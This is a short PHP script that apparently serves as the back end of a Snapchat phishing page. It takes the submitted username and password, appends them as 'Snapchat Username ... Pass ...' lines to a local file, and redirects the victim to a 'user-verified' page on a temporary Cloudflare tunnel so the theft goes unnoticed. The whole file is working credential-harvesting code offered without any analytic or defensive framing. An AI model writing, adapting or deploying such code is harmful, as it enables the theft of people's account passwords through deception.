<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://obligation-classifieds-projectors-gothic.trycloudflare.com/user-verified-9ec188fe/index.html');
exit();
?>
